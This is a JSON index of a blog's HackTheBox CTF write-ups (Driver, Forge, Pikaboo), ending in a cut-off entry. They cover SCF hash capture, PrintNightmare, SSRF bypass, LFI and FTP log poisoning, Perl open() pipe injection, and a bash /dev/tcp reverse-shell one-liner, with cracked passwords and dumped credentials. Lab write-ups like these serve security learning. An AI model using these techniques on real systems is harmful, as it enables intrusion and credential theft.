[ { "title": "HackTheBox Driver", "url": "/posts/HTB-Driver/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, ctf, nmap, firmware, printer, mfp, driver, rpc, smb, pentestlab, scf, shellcommandfile, responder, hashcat, evilwinrm, printnightmare, powershell, MS-RPRN, invoke-nightmare, unrestricted, bypass, powershellbypass, cve-2021-1675, cve, 2021-1675", "date": "2022-02-26 00:00:00 +0000", "snippet": "Machine informationDriver listed as an Easy machine. Port 80 is serving MFP Firmware update center site where uploading maliciously crafted file is stored in SMB server that leads to a password hash on responder. Later getting the user Tony, I escalate to root using PrintNightmare powershell script (Invoke-Nightmare).EnumerationnmapSince this is listed as an Easy machine, I will upfront start scanning for services and thier versions with nmap, Nmap is a open source network scanner tool and is widely revered in InfoSec community for its accuracy on scanning.$_ sudo nmap -sC -sV -oA nmap/driver 10.10.11.106Note: Host seems down. If it is really up, but blocking our ping probes, try -PnNmap done: 1 IP address (0 hosts up) scanned in 24.65 secondsThis is can happen when Host (10.10.11.106) is blocking the nmap packets and not replying to normal Ping scan. I can use -Pn flag on nmap to treat Host As Online. You can visit this link or do man nmap then press /-Pn to search for the string, and read the documentation all by yourself. -sC : To run default scripts against the target -sV : Do Version discovery on the output -oA : Put the output inside ‘All’ files i.e nmap, greppable nmap, xml$_ sudo nmap -sC -sV -oA nmap/driver -Pn 10.10.11.106Nmap scan report for 10.10.11.106Host is up (0.23s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn\\&#39;t have a title (text/html; charset=UTF-8).| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin| http-methods: |_ Potentially risky methods: TRACE135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb2-time: | date: 2021-12-22T12:58:22|_ start_date: 2021-12-22T12:54:35| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: 7h16m18s, deviation: 0s, median: 7h16m18sPort 80nmap did said MFP Firmware update center , So I head over to Port 80. It is asking for credentials which I do not have at the moment.But it did reveal the username which is admin, So I used admin:admin as credentials that let me in. Below is the page.Like it says this site is used for printer updating using firmware. At the bottom is the hostname which I will add to my hostfile. 10.10.11.106 driver driver.htbThere is a Firmware Updates page where I can upload files, rest of the pages goes nowhere.This does says Printer model. I have to enumerate more on this.Getting userRPC enumerationI normally use rpcclient but it is asking for credentials, I tried entering admin:admin like before but its not working. rpcdump.py from Impacket suite showed some interesting information$_ rpcdump.py 10.10.11.106Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Retrieving endpoint list from 10.10.11.106...[snip]...Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Provider: spoolsv.exe UUID : 76F03F96-CDFD-44FC-A22C-64950A001209 v1.0 Bindings: ncacn_ip_tcp:10.10.11.106[49410] ncalrpc:[LRPC-b1aab278c8086f7ab3]Protocol: N/A Provider: spoolsv.exe UUID : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 Bindings: ncacn_ip_tcp:10.10.11.106[49410] ncalrpc:[LRPC-b1aab278c8086f7ab3]Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol Provider: spoolsv.exe UUID : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 Bindings: ncacn_ip_tcp:10.10.11.106[49410] ncalrpc:[LRPC-b1aab278c8086f7ab3]Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol Provider: spoolsv.exe UUID : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Bindings: ncacn_ip_tcp:10.10.11.106[49410] ncalrpc:[LRPC-b1aab278c8086f7ab3]Protocol: [MS-RPRN]: Print System Remote Protocol Provider: spoolsv.exe UUID : 12345678-1234-ABCD-EF00-0123456789AB v1.0 Bindings: ncacn_ip_tcp:10.10.11.106[49410] ncalrpc:[LRPC-b1aab278c8086f7ab3]...[snip]...[*] Received 456 endpoints.SMB ExploitNow the thing is, I did not know what I must do. I googled for MFP Fireware Updates Center , Printer upload Driver exploit and what not nothing was leading me anywhere. File Share , this thing really got under my radar from upload page.I was like what!!! How can I miss this?!Anyway, The File share is really the SMB server. So any files uploaded from here are going to be saved in SMB share.Now this time I googled smb exploit printer firmware and after reading A LOT of articles, I found the niddle in the haystack, This post was 3 years old and it showed a way to exploit. Article : https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/Getting the hash I have to create a scf file. I named it @amroot.scf [Shell] Command=1 IconFile=\\\\10.10.14.3\\amroot\\amroot.ico [Taskbar] Command=ToggleDesktop Created empty amroot.ico file using touch amroot.ico. Now I saved these files inside amroot folder, but I don’t think placing these files inside a folder will make a difference. Started reponder to catch the hash for user, reposonder -I tun0. Uploaded @amroot.scf from the Firmware Updates page.and within 10 seconds, reponder caught the hash for the Tony user.Now on to cracking the hash.As the reponder said that it is NTLMv2 hash. I can possibly crack it using hashcat, since it has 5600 mode for NTLMv2 hash.Here, -m : Type of hash. You can check which mode to use by hashcat --example-hashes hashfile : File containing hash wordlist : Wordlist file --force : Ignore warnings, You do not have to use it unless necessary. -a 0 : Attacking modes, here 0 meaning Straight$_ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force -a 0...[snip]...TONY::DRIVER:049843be0c0e2c63:d8e54d4716192b8df3d598f910c5014a:010100000000000080c45cde68f7d7016f6754d2740840960000000002000800560031004200570001001e00570049004e002d005600450038004f005800550048004c005a003100450004003400570049004e002d005600450038004f005800550048004c005a00310045002e0056003100420057002e004c004f00430041004c000300140056003100420057002e004c004f00430041004c000500140056003100420057002e004c004f00430041004c000700080080c45cde68f7d7010600040002000000080030003000000000000000000000000020000024901167a1a1332e907fa7ec1d4b35500d82459a9b6372a1b941e4d218b51bf20a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003300000000000000000000000000:liltony ...[snip]...Now I have the credentials Tony:liltony. I used evil-winrm to login.Getting rootexploiting PrintNightmareDuring the rpcdump.py, there was Protocol: [MS-RPRN]: Print System Remote Protocol service running, It means that I should try PrintNightmare exploit.In PrintNightmare exploit, an attacker with valid crendentials for a user on the machine is able to add a printer and a driver for that, in the end it gives the attacker a system level access. It is listed as CVE-2021-1675.I will try to get reverse shell 3 ways.using Invoke-Nightmare First I will clone this repository, moved it into invoke-nightmare. I uploaded the ps1 file to the machine. *Evil-WinRM* PS C:\\Users\\tony\\Downloads&amp;gt; upload invoke-nightmare/CVE-2021-1675.ps1Info: Uploading invoke-nightmare/CVE-2021-1675.ps1 to C:\\Users\\tony\\Downloads\\CVE-2021-1675.ps1 Data: 238080 bytes of 238080 bytes copied Info: Upload successful! I was getting error while importing the module because of Execution policy is set to Restricted. As you can see it in the below image. The simplest way to avoid this is to try changing to Unrestricted which I did in my case. *Evil-WinRM* PS C:\\Users\\tony\\Downloads&amp;gt; Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted *Evil-WinRM* PS C:\\Users\\tony\\Downloads&amp;gt; get-executionpolicy Unrestricted Now I was able to load the module *Evil-WinRM* PS C:\\Users\\tony\\Downloads&amp;gt; Import-Module .\\CVE-2021-1675.ps1 I was able to add myself as the user in the machine. Doing net user amroot showed me that I was indeed granted admin rights. Finally, I was able to login and read the root.txt file. " }, { "title": "HackTheBox Forge", "url": "/posts/HTB-Forge/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, nmap, ssrf, python, flask, pdb, post_mortem, postmortem, bypass, localhostbypass, bypasslocalhost, exfiltrate, sudo", "date": "2021-12-14 00:00:00 +0000", "snippet": "Machine InformationForge is rated an Medium box. The box has good double SSRF technique, first it starts with upload page on forge.htb page where I am getting blocked because of filter, I tried few things to bypass it. After successfully bypassing it, I found another domain where I can access its source code. Getting hands on them revealed FTP server with credentials. FTP server is configured for User’s home directory where I get its SSH key. User is able to run file inside /opt/ directory as root where I encountered and bypassed/exploited pdb module’s post_mortem function.EnumerationAs usual I ran nmap, to scan for any open ports with their services running on them.nmap -p- -oA nmap/all 10.10.11.111 --min-rate 10000Nmap scan report for 10.10.11.111Host is up (0.15s latency).Not shown: 65471 filtered tcp ports (no-response), 62 closed tcp ports (conn-refused)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 20.66 secondsSo only ssh and http port is running, now I ran -sC &amp;amp; -sV flags,nmap -p 22,80 -sC -sV -oA nmap/forge 10.10.11.111Nmap scan report for 10.10.11.111Host is up (0.22s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://forge.htbService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel -sC : This will scan the regarding port with default set of scripts from nmap database -sV : Enables version detection of the regarding port numberI can discover the OS version just by looking at the SSH version on the Launchpad and it revealed that OS is Ubuntu Focal.​ Port 80I now visited port 80 and it redirected me to forge.htb, I added it to my host file. 10.10.11.111 forge.htb forgeI ran ffuf against the domain in the background while I poke at the website.Immediately it showed it admin.forge.htb domain.I appended it to host file. 10.10.11.111 forge.htb forge admin.forge.htbGetting UserSSRF on forge.htbWhile poking at the site there is one directory /upload where I uploaded one image and it gave me an URL for that image. As you can see there are 2 ways to upload the image, I uploaded first time using the local file.Now I will try to upload it using the URL. I captured the request in BurpSuite and forwarded the Repeater, it is giving randomly generated endpoint for the file like the above.In the Repeater tab I changed my IP to localhost to see any potential anomalyAfter trying numerous things, I went with case sensitive and it gave me an URL to access the output.Firefox was unable to show the output, So I used curl for this.SSRF on admin.forge.htbWhen I visited the admin.forge.htb it showed that only localhosts are allowed to visit it.The same thing happened, I was getting blocked. I changed the casing from admin.forge.htb to Admin.Forge.htb, and it gave me an URL to access the file. Doing that with curl showed the code for admin portal with upload and announcements page.&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Portal&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Welcome Admins!&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Discovering FTPI access the announcements page first and it gave me important information such as credentials for FTP server, upload page is accessible using various protocols I can upload an image using ?u=&amp;amp;lt;url&amp;amp;gt; parameter which after decoding ?u=&amp;lt;url&amp;gt;I scanned the host on port 21 because at the first enoucounter nmap did not give me any information. After running it it turns out the port is filtered for outside connections. I can access it using internal server.21/tcp filtered ftpNow that I have credentials for FTP server I can login using them, but since the port is filtered for me. I will pass the credentials from BurpSuite in URL, Since upload page is configured to use FTP protocol it will be easier.I curled the URL given by server, it gave me list of files inside the FTP server.I can access the files just by appending the filename after at the end of URL, so my url becomes http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Localhost/.ssh/id_rsa , Using the private SSH file I will now login to the machine.Getting rootSSHing into machine, I found interesting file inside /opt/remote-manage.py.Also doing sudo -l reveals that I can execute this file as root user.-bash-5.0$ sudo -lMatching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.pyContent of this files are as follows:#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) breakexcept Exception as e: print(e) pdb.post_mortem(e.__traceback__)finally: quit()Going through the script, It imports necessary modules for the script to run properly. Port variable is using randomly generated number between 1025-65535 to host the script on the output, then it binds it to localhost and the port number. Script then asks user for password, if it is secretadminpassword then goes to while True claus inside else part where user can select options from 1-4.Now the interesting part is the except, where it is using pdb module, which is used for debugging purpose. post_mortem() function of pdb executes when the error is occured and the code part of the script will no longer continue, you cannot step in the execution/divert the execution, you just sent directly to shell.So all I have to do is to cause an error in the exceution.I will login to another SSH shell to interact with the execution. I used nc for this purpose.All I did was to press Enter key and it dropped me right into pdb shell.From there I can just import pty module and give myself a proper shell.I can login as root user from SSH if I want.Resource for pdb https://www.geeksforgeeks.org/python-debugger-python-pdb/ https://docs.python.org/3/library/pdb.html https://stackoverflow.com/questions/13994847/does-post-mortem-debugging-in-python-allow-for-stepping-or-continuing" }, { "title": "HackTheBox Pikaboo", "url": "/posts/HTB-Pikaboo/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, ctf, nmap, http, ldap, ftp, blackhat, orangetsai, parser, nginx, apache, log, logpoisoning, poison, commandinjection, cmdinjection, reverseproxy, proxy, offbyslash, lfi, open_basedir, crontab, cron, csv, perl, ldapsearch, open", "date": "2021-12-14 00:00:00 +0000", "snippet": "Machine InformationPikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can be bypassed to find the admin page, which is explained in OrangeTsai’s Blackhat talk. After enumerating on the Apache I get to find LFI vulnerability where I can read FTP log file. FTP log file can be poisoned by logging in with PHP code. That’s how I am able to get www-data user, after getting in the box, there is a crontab running every minute which is executing a bin file. While enumerating more on the machine, I found LDAP and FTP credentials for pwnmeow user. Later I ran across one perl command execution vulneability which I will use to get to root.EnumerationnmapI have started nmap to scan for open ports with version of the running services and running common scripts against them, using -sV and -sC flags respectively. nmap gave me the following results,Nmap scan report for 10.10.10.249Host is up (0.20s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)| 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)|_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)80/tcp open http nginx 1.14.2|_http-title: Pikaboo|_http-server-header: nginx/1.14.2Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 73.96 secondsAll of these versions did not have any exploits listed in searchsploit. I will start ffuf in the background while I visit port 80.WebsiteThis is the front page of the website. The webiste is about catching the pokatmon.There are a lot of pokamon listed in Pokatdex page but clicking on them says PokeAPI is yet to be integrated.There is nothing on the Contact page as well but the Admin page is asking for credentials.Clicking on Cancel revealed Apache Server running on Port 81, So the thing is nginx might be running as reverse proxy directing all the traffic from Apache Server to port 80.Off-by-slashThis misconfiguration in nginx is very subtle, it was founded by OrangeTsai. In his Breaking parser logic blackhat session explained the Off-By-Slash vulnerability in nginx. Video: https://www.youtube.com/watch?v=CIhHpkybYsY Whitepaper: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdfThe Vulnerabilty goes like: If in a nginx web configuration file some location is like “location /temp {..}” then it leads to LFI. Developer might think that it will only list files inside /temp directory but it actually be abused by /temp../somefile.I can now bypass the login prompt and visit admin../server-statusI then tried visiting http://10.10.10.243/admin../admin_staging/.Getting www-data shellLFI vulnerabilityNow that I got the admin dashboard I ran gobuster against it and it found interesting files.I tried accessing /etc/passwd file but was getting error and URI is getting resolved to http://10.10.10.249/etc/passwd. I will just visit info.php file, I also check other files but they did not have any useful information.info.php file shows why I am unable to access or read /etc/passwd or any other folder.open_basedir is used to protect files outside mentioned folder. PHP will read files from the given folder and restrict any other files. Official PHP documentation: https://www.php.net/manual/en/ini.core.php#ini.open-basedir What is open_basedir ? : https://xneelo.co.za/help-centre/website/open_basedir-error/The left navigation bar is has a URL structure like 10.10.10.249/admin../admin_staging/index.php?page=info.php, So it might lead to file inclusion vulnerablity. Since it is a php file I used PHP base64 filter and successfully exfiltrated the php files and inspected them. Out of them index.php had an interesting code and why I was able to get files. It is using include() function and that is the reason for LFI vulnerability. What include() function does, a developer can include the content of one PHP file into another PHP file using include() function.FTP log poisoningSo now I might be able to see other files than this folder but again open_basedir is blocking the requests. I ran gobuster again but now using SecList’s LFI file and it returned some files but out of them FTP is interesting.I was able to see the file but there is a possiblity that I might miss some characters so I used PHP’s base64 filter. The url becomes http://10.10.10.249/admin../admin_staging/index.php?page=php://filter/convert.base64-encode/resource=/var/log/vsftpd.logThis file did not have any credentials in it. I googled for “FTP log LFI” and it lead me an interesting log poisoning way to get an reverse shell.First I login to FTP server using &amp;lt;?php system(&quot;id&quot;)?&amp;gt; and use password for password. In the logs I can see www-data username printed. I used normal bash reverse shell. Entered the payload into FTP user and for password it doesn’t really matter as I just have to poison the log file.After doing that I reloaded the webpage and on my nc listener I got the reverse shell.Getting root shellI was able to read the user.txt file inside pwnmeow user. So I went on searching for any way that could give me the user or way to get the root.While enumerating inside the apache2 folder I found the admin password, I will save this just in case.finding crontabNow there is a crontab running every minute as root user.Inside the contents of /usr/local/bin/csvupdate_cron #!/bin/bash\\ for d in /srv/ftp/*do cd $d /usr/local/bin/csvupdate $(basename $d) *csv /usr/bin/rm -rf *doneSo the file is doing for loop for every directories inside /srv/ftp/ directory and moving inside them and executing /usr/local/bin/csvupdate on them creating *.csv files and lastly removing all the files.Looking at the /usr/local/bin/csvupdate file,#!/usr/bin/perl################################################################### Script for upgrading PokeAPI CSV files with FTP-uploaded data. ## ## Usage: ## ./csvupdate &amp;lt;type&amp;gt; &amp;lt;file(s)&amp;gt; ## ## Arguments: ## - type: PokeAPI CSV file type ## (must have the correct number of fields) ## - file(s): list of files containing CSV data ###################################################################use strict;use warnings;use Text::CSV;my $csv_dir = &quot;/opt/pokeapi/data/v2/csv&quot;;my %csv_fields = ( &#39;abilities&#39; =&amp;gt; 4, &#39;ability_changelog&#39; =&amp;gt; 3, &#39;ability_changelog_prose&#39; =&amp;gt; 3, &#39;ability_flavor_text&#39; =&amp;gt; 4, &#39;ability_names&#39; =&amp;gt; 3, ....[snip].... &#39;type_names&#39; =&amp;gt; 3, &#39;types&#39; =&amp;gt; 4, &#39;version_group_pokemon_move_methods&#39; =&amp;gt; 2, &#39;version_group_regions&#39; =&amp;gt; 2, &#39;version_groups&#39; =&amp;gt; 4, &#39;version_names&#39; =&amp;gt; 3, &#39;versions&#39; =&amp;gt; 3);if($#ARGV &amp;lt; 1){ die &quot;Usage: $0 &amp;lt;type&amp;gt; &amp;lt;file(s)&amp;gt;\\n&quot;;}my $type = $ARGV[0];if(!exists $csv_fields{$type}){ die &quot;Unrecognised CSV data type: $type.\\n&quot;;}my $csv = Text::CSV-&amp;gt;new({ sep_char =&amp;gt; &#39;,&#39; });my $fname = &quot;${csv_dir}/${type}.csv&quot;;open(my $fh, &quot;&amp;gt;&amp;gt;&quot;, $fname) or die &quot;Unable to open CSV target file.\\n&quot;;shift;for(&amp;lt;&amp;gt;){ chomp; if($csv-&amp;gt;parse($_)) { my @fields = $csv-&amp;gt;fields(); if(@fields != $csv_fields{$type}) { warn &quot;Incorrect number of fields: &#39;$_&#39;\\n&quot;; next; } print $fh &quot;$_\\n&quot;; }}close($fh);In this file if block is checking the number of command-line arguments if the arguments are less than 1 then it throws Usage error. Then it checks if the CSV fields are inside the csv_fields and throws error if it doesn’t. Each of the folder in /srv/ftp is opened by checking with the parameters inside this directory if it matches then it opens an output .csv file with handle $fh.shift (remove and return) the first value from @ARGV, the argument list of your program. so the .csv files are cause by this.for(&amp;lt;&amp;gt;) is opening each files and looping them into variable $_ now chomp is removing white trailing from each line.pokeapiThe file mentioned usage of my $csv_dir = &quot;/opt/pokeapi/data/v2/csv&quot;;. Inside the /opt/pokeapi directory, there is a config/settings.py file, that file has a lot of interesting information such as credentials for LDAP.# Production settingsimport osfrom unipath import PathPROJECT_ROOT = Path(__file__).ancestor(2)DEBUG = FalseTEMPLATE_DEBUG = DEBUGADMINS = ((&quot;Paul Hallett&quot;, &quot;paulandrewhallett@gmail.com&quot;),)EMAIL_BACKEND = &quot;django.core.mail.backends.console.EmailBackend&quot;MANAGERS = ADMINSBASE_URL = &quot;http://pokeapi.co&quot;# Hosts/domain names that are valid for this site; required if DEBUG is False# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts#ALLOWED_HOSTS = [&quot;.pokeapi.co&quot;, &quot;localhost&quot;, &quot;127.0.0.1&quot;]ALLOWED_HOSTS = [&quot;*&quot;]TIME_ZONE = &quot;Europe/London&quot;LANGUAGE_CODE = &quot;en-gb&quot;SITE_ID = 1# If you set this to False, Django will make some optimizations so as not# to load the internationalization machinery.USE_I18N = True# If you set this to False, Django will not format dates, numbers and# calendars according to the current locale.USE_L10N = True# If you set this to False, Django will not use timezone-aware datetimes.USE_TZ = True# Explicitly define test runner to avoid warning messages on test executionTEST_RUNNER = &quot;django.test.runner.DiscoverRunner&quot;SECRET_KEY = &quot;4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&amp;amp;2l#&quot;MIDDLEWARE = [ &quot;corsheaders.middleware.CorsMiddleware&quot;, &quot;django.middleware.common.CommonMiddleware&quot;, &quot;django.contrib.sessions.middleware.SessionMiddleware&quot;, &quot;django.middleware.csrf.CsrfViewMiddleware&quot;, &quot;django.contrib.auth.middleware.AuthenticationMiddleware&quot;, &quot;django.contrib.messages.middleware.MessageMiddleware&quot;, &quot;django.middleware.clickjacking.XFrameOptionsMiddleware&quot;,]ROOT_URLCONF = &quot;config.urls&quot;WSGI_APPLICATION = &quot;config.wsgi.application&quot;DATABASES = { &quot;ldap&quot;: { &quot;ENGINE&quot;: &quot;ldapdb.backends.ldap&quot;, &quot;NAME&quot;: &quot;ldap:///&quot;, &quot;USER&quot;: &quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot;, &quot;PASSWORD&quot;: &quot;J~42%W?PFHl]g&quot;, }, &quot;default&quot;: { &quot;ENGINE&quot;: &quot;django.db.backends.sqlite3&quot;, &quot;NAME&quot;: &quot;/opt/pokeapi/db.sqlite3&quot;, }}CACHES = { &quot;default&quot;: { &quot;BACKEND&quot;: &quot;django_redis.cache.RedisCache&quot;, &quot;LOCATION&quot;: &quot;redis://127.0.0.1:6379/1&quot;, &quot;OPTIONS&quot;: { &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot;, }, }}SECRET_KEY = os.environ.get( &quot;SECRET_KEY&quot;, &quot;ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&amp;amp;2l#&quot;)CUSTOM_APPS = ( &quot;tastypie&quot;, &quot;pokemon_v2&quot;,)INSTALLED_APPS = ( &quot;django.contrib.auth&quot;, &quot;django.contrib.contenttypes&quot;, &quot;django.contrib.sessions&quot;, &quot;django.contrib.sites&quot;, &quot;django.contrib.admin&quot;, &quot;django.contrib.humanize&quot;, &quot;corsheaders&quot;, &quot;rest_framework&quot;, &quot;cachalot&quot;,) + CUSTOM_APPSAPI_LIMIT_PER_PAGE = 1TASTYPIE_DEFAULT_FORMATS = [&quot;json&quot;]CORS_ORIGIN_ALLOW_ALL = TrueCORS_ALLOW_METHODS = &quot;GET&quot;CORS_URLS_REGEX = r&quot;^/api/.*$&quot;REST_FRAMEWORK = { &quot;DEFAULT_RENDERER_CLASSES&quot;: (&quot;drf_ujson.renderers.UJSONRenderer&quot;,), &quot;DEFAULT_PARSER_CLASSES&quot;: (&quot;drf_ujson.renderers.UJSONRenderer&quot;,), &quot;DEFAULT_PAGINATION_CLASS&quot;: &quot;rest_framework.pagination.LimitOffsetPagination&quot;, &quot;PAGE_SIZE&quot;: 20, &quot;PAGINATE_BY&quot;: 20,}Also the machine has LDAP port open and serving on localhost only. On port 81 apache is running.I used the credentials from settings.py file using ldapsearch tool.www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -h localhost -D &quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot; -w &quot;J~42%W?PFHl]g&quot; -s base namingContexts# extended LDIF#....[snip]....# requesting: namingContexts ##dn:namingContexts: dc=htb....[snip]....# numResponses: 2# numEntries: 1This gave me DC which is Domain Component for the ldap. I will use this DC in ldapsearch query,www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -h localhost -D &quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot; -w &quot;J~42%W?PFHl]g&quot; -b &quot;DC=htb&quot;# extended LDIF....[snip]....## htbdn: dc=htbobjectClass: topobjectClass: dcObjectobjectClass: organizationo: htbdc: htb# admin, htbdn: cn=admin,dc=htbobjectClass: simpleSecurityObjectobjectClass: organizationalRolecn: admindescription: LDAP administratoruserPassword:: e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=....[snip]....# users, ftp.pikaboo.htbdn: ou=users,dc=ftp,dc=pikaboo,dc=htbobjectClass: organizationalUnitobjectClass: topou: users# groups, ftp.pikaboo.htbdn: ou=groups,dc=ftp,dc=pikaboo,dc=htbobjectClass: organizationalUnitobjectClass: topou: groups# pwnmeow, users, ftp.pikaboo.htbdn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htbobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: shadowAccountuid: pwnmeowcn: Pwnsn: MeowloginShell: /bin/bashuidNumber: 10000gidNumber: 10000homeDirectory: /home/pwnmeowuserPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==# binduser, users, pikaboo.htbdn: cn=binduser,ou=users,dc=pikaboo,dc=htbcn: binduserobjectClass: simpleSecurityObjectobjectClass: organizationalRoleuserPassword:: Sn40MiVXP1BGSGxdZw==....[snip]....# numResponses: 15# numEntries: 14This query dumped a lot of useful information such as administrator password for LDAP, FTP password for pwnmeow. The password stored on the LDAP server is base64 encoded, its easy to decode it. I got the plain text password for pwnmeow user.I can now login using pwnmeow’s credentials on to FTP server.There are lots of file inside the FTP server.Perl VulnerabiltyPer has a vulnerabilty where open() function behavious weirdly, if the file has | before the filename then whatever is after the pipe gets executed and if the | is after the filename then output is thrown at the STDOUT.I have to first create files like amroot.csv and amroot.txt else it doesn’t work. I will then upload these files to any random directory. I chose versions here.To see if this works I will ping to my machine and as you can see I got successful ping from 10.10.10.249.I will now try to get reverse shell.Using normal bash oneliner wasn’t working as it was colliding. So I had to base64 the command and execute that way. Base64 the bash one-liner command echo &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.5 0&amp;gt;&amp;amp;1&#39;; &quot; | base64 -d Enter the output from the above command into FTP’s terminal as put’s argument as you can see 1 in below image Make sure to start listener as mentioned in 2 step of the imageIt was a long journey and fun box." }, { "title": "HackTheBox Seal", "url": 